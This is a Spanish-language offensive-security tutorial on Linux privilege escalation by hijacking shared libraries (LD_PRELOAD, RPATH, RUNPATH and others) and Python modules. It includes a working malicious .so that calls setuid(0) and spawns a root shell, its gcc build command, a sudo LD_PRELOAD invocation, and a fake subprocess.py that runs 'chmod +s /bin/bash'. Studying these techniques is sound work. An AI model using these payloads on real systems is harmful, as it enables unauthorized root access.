# Shared Object

En esta sección vamos a ver diferentes formas de **secuestrar** objetos compartidos (como por ejemplo **librerías**) del sistema, con el objetivo de poder ejecutar comandos arbitrarios.

## Shared libraries

Los ejecutables Linux son normalmente archivos **ELF** que declaran una lista de **dependencias** que necesitan, y un **interprete**. En tiempo de **ejecuión** se cargan dinámicamente las librerías compartidas **(.so)** en memoria.

Existen dos tipos de librerías:

- **Librerías estáticas** (`.a`): se incluyen en el ejecutable al compilarse y no pueden cambiarse después.
    
- **Librerías dinámicas** (`.so`): cargadas en tiempo de ejecución, pueden sustituirse o modificarse sin recompilar el programa.
    

Nuestro objetivo como atacante es que en este proceso se **cargue en memoria** un código malicioso.

## Ubicaciones de librerías en linux

La siguiente lista de ubicaciones va ordenada por **prioridad**.

#### 1. LD_PRELOAD

Variable de entorno que contiene una lista de rutas absolutas a archivos `.so`. El _loader_ inyecta estas librerías antes que cualquier otra.

> En binarios **SUID/SGID** se deshabilita esta opción por seguridad.

Si el **sudoers** nos permite ejecutar una herramienta como otro usuario y utilizar `LD_PRELOAD`, tendremos el control sobre este usuario:

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

### 2. DT_RPATH

Campo **embebido** en el `ELF` con una lista de directorios a buscar **antes** de `LD_LIBRARY_PATH`.

```bash
# Consultar DT_RPATH
readelf -d ./bin | grep RPATH
objdump -p ./bin | grep RPATH
```

> `DT_RPATH` esta obsoleto, pero aun se utiliza. Sí funciona en con ejecutables **SUID**.

### 3. LD_LIBRARY_PATH

Variable de entorno que contiene directorios separados por `:` que se recorren en orden.

```bash
echo $LD_LIBRARY_PATH
```

> Se ignora por el _loader_ cuando tiene privilegios **SUID/SGID**.

### 4. `DT_RUNPATH`

Sucesor de **RPATH**, se evalua despúes de `LD_LIBRARY_PATH`.

```bash
readelf -d ./bin | grep RUNPATH
objdump -p ./bin | grep RUNPATH
```

> Sí funciona en con ejecutables **SUID**.

### 5. ld.so.preload

Archivo de texto leído por `ld.so`. Cada línea es una librería a cargar (ruta al `.so`) en todos los procesos.

### 6. ld.so.cache

Base de datos binaria (generada por `ldconfig`) que mapea nombres de librería a ruta completa para acelerar búsquedas.

```bash
ldconfig -p
```

### 7. Directorios por defecto

Rutas finales de búsqueda: `/lib`, `/usr/lib`, `/lib64`, `/usr/local/lib`, etc.

## Identificación de dependencias

Podemos utilizar las siguientes herramientas para detectar las dependencias que utiliza un ejecutable:

- `ldd`: Lista bibliotecas y rutas resueltas (marca _not found_ si no se encuentra).

```bash
ldd <file>
```

- `readelf`: Muestra `DT_NEEDED`, `RPATH`, `RUNPATH`.

```bash
readelf -d <file>
```

- `objdump`: Similar a `readelf`.

```bash
objdump -p <file>
```

- `strace`: Observa en vivo qué rutas intenta abrir:

```bash
strace -e openat <file>
```

## Proceso de ataque

1. Enumerar binarios **privilegios** con permisos `SUID/SGID`, o permisos en el `sudoers` que nos permita ejecutar como otro usuario un fichero.
    
2. Análisis de **dependencias** para detectar anomalías que podemos aprovechar para ejecutar código arbitrario como otro usuario.
    

```bash
for dir in $(echo "$PATH" | tr ':' ' '); do [[ -w $dir ]] && echo "$dir es writable"; done 
```

> Podemos sustituir `$PATH` por una variable de entorno con directorios separados por `:` para detectar si se puede escribir en ellos.

Crear un `.so` malicioso:

```c
#include <stdlib.h>
#include <unistd.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
```

Debemos definir un método constructor `__attribute__((constructor))` o una función `_init` para asegurarnos que nuestro código se ejecuta tras realizar el proceso de mapeo de librerías (antes de comenzar con el main del programa).

> Solo puedo haber un `_init`, si ya hay otro se debe usar el constructor.

La línea `unsetenv("LD_PRELOAD")` para evitar **bucles de carga** si realizamos una técnica que requiera de esta variable de entorno, en otros casos **no es necesario**.

## Python3 library hijacking

El mismo concepto puede ser aplicado para secuestrar librerías de **python3**. Podemos analizar el **path** para ver si tenemos privilegios de escritura en alguna ruta:

```bash
python3 -c 'import sys; print(sys.path)' 
```

> Por defecto, el `PATH` comenzará con `''` referenciando a la carpeta donde esta ubicado el **script**.

Ejemplo: Si tengo privilegios de escritura en la misma carpeta donde se ejecuta un `scrit.py` que utiliza librerías como `subprocess`, puede crear un fichero `subprocess.py` que contenga:

```python
import os

os.system("chmod +s /bin/bash")
```

Si el usuario `root` ejecuta **script.py** le asignará permiso `SUID` a `/bin/bash`.